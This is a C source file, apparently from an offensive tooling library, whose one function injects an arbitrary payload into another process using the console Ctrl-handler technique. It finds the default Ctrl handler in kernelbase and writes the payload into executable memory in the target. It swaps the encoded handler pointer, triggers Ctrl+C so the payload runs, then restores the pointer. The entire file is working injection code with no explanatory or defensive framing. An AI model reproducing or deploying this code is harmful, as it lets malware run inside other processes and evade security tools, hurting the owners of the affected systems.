#include "Win32Helper.h"

BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId)
{
	typedef NTSTATUS(NTAPI* RTLENCODEREMOTEPOINTER)(HANDLE, PVOID, PVOID*);
	RTLENCODEREMOTEPOINTER RtlEncodeRemotePointer = NULL;
	HMODULE hNtdll = NULL;
	HMODULE hKernelbase = NULL;
	MODULEINFO KernelbaseInformation = { 0 };
	PCHAR KernelBaseDefaultHandler = NULL;
	PCHAR KernelBaseSingleHandler = NULL;
	DWORD64 Encoded = 0;
	DWORD ConsoleAttachList[2] = { 0 };
	DWORD ParentId = 0;
	HWND hWindow = NULL;
	PVOID EncodedAddress = NULL;
	HANDLE hHandle = NULL;
	LPVOID BaseAddress = NULL;
	INPUT Input = { 0 };
	BOOL bFlag = FALSE;			

	hNtdll = GetModuleHandleEx2W(L"ntdll.dll");
	hKernelbase = GetModuleHandleEx2W(L"kernelbase.dll");

	if (!hNtdll || !hKernelbase)
		goto EXIT_ROUTINE;

	RtlEncodeRemotePointer = (RTLENCODEREMOTEPOINTER)GetProcAddressA((DWORD64)hNtdll, "RtlEncodeRemotePointer");
	if (!RtlEncodeRemotePointer)
		goto EXIT_ROUTINE;

	if (!K32GetModuleInformation(GetCurrentProcessNoForward(), hKernelbase, &KernelbaseInformation, sizeof(KernelbaseInformation)))
		goto EXIT_ROUTINE;

	KernelBaseDefaultHandler = (PCHAR)MemoryFindMemory(hKernelbase, KernelbaseInformation.SizeOfImage, (PVOID)"\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9);
	if (KernelBaseDefaultHandler == NULL)
		goto EXIT_ROUTINE;

	Encoded = (DWORD64)EncodePointer(KernelBaseDefaultHandler);
	if (Encoded == 0)
		goto EXIT_ROUTINE;

	KernelBaseSingleHandler = (PCHAR)MemoryFindMemory(hKernelbase, KernelbaseInformation.SizeOfImage, &Encoded, 8);
	if (KernelBaseSingleHandler == NULL)
		goto EXIT_ROUTINE;

	if (GetConsoleProcessList(ConsoleAttachList, 2) < 2)
		goto EXIT_ROUTINE;

	if (ConsoleAttachList[0] != GetCurrentProcessId())
		ParentId = ConsoleAttachList[0];
	else
		ParentId = ConsoleAttachList[1];

	if (!FreeConsole())
		goto EXIT_ROUTINE;

	if (!AttachConsole(TargetProcessId))
		goto EXIT_ROUTINE;

	hWindow = (HWND)GetPeb()->ProcessParameters->ConsoleHandle;
	if (hWindow == NULL)
		goto EXIT_ROUTINE;

	if (!FreeConsole())
		goto EXIT_ROUTINE;

	if (!AttachConsole(ParentId))
		goto EXIT_ROUTINE;

	hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, TargetProcessId);
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	BaseAddress = VirtualAllocEx(hHandle, NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BaseAddress == NULL)
		goto EXIT_ROUTINE;

	if (!WriteProcessMemory(hHandle, BaseAddress, Payload, PayloadSizeInBytes, NULL))
		goto EXIT_ROUTINE;

	CloseHandle(hHandle);

	hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, TargetProcessId);
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	RtlEncodeRemotePointer(hHandle, BaseAddress, &EncodedAddress);

	if (!WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL))
		goto EXIT_ROUTINE;

	Input.type = INPUT_KEYBOARD;
	Input.ki.wScan = 0;
	Input.ki.time = 0;
	Input.ki.dwExtraInfo = 0;
	Input.ki.wVk = VK_CONTROL;
	Input.ki.dwFlags = 0; // 0 for key press

	SendInput(1, &Input, sizeof(INPUT));
	Sleep(100);

	PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);

	Sleep(100);

	Input.type = INPUT_KEYBOARD;
	Input.ki.wScan = 0;
	Input.ki.time = 0;
	Input.ki.dwExtraInfo = 0;
	Input.ki.wVk = VK_CONTROL;
	Input.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &Input, sizeof(INPUT));

	RtlEncodeRemotePointer(hHandle, KernelBaseDefaultHandler, &EncodedAddress);

	if (!WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (Payload)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Payload);

	if (hHandle)
		CloseHandle(hHandle);

	return bFlag;
}